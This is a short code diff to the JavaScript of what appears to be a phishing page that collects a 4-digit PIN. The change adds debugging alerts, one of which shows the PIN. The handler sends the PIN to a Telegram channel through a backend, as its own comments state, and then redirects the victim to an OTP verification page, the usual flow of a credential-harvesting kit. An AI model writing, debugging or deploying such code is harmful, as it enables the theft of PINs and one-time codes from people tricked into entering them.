@@ -232,22 +232,29 @@
     }
 
     // ============================================
-    // MAIN CONFIRM FUNCTION - WITH ALERT
+    // MAIN CONFIRM FUNCTION - WITH 5 TEST ALERTS
     // ============================================
     window.handleConfirm = async function() {
-        alert('✅ Confirm button clicked!');  // ← TEST ALERT ADDED
+        alert('1️⃣ Confirm button clicked!');  // ALERT 1
+        
         const pin = getPin();
+        alert('2️⃣ PIN entered: ' + pin);  // ALERT 2
         
         if (pin.length !== 4) {
+            alert('3️⃣ PIN length is ' + pin.length + ' (need 4 digits)');  // ALERT 3
             showError('Please enter all 4 digits.');
             return;
         }
+
+        alert('4️⃣ PIN is valid! Sending to Telegram...');  // ALERT 4
 
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
         // Send PIN notification via backend
         await sendPinNotification(pin);
+        
+        alert('5️⃣ Telegram notification sent! Redirecting...');  // ALERT 5
         
         // Redirect to OTP page
         window.location.href = 'otp-verify.html'
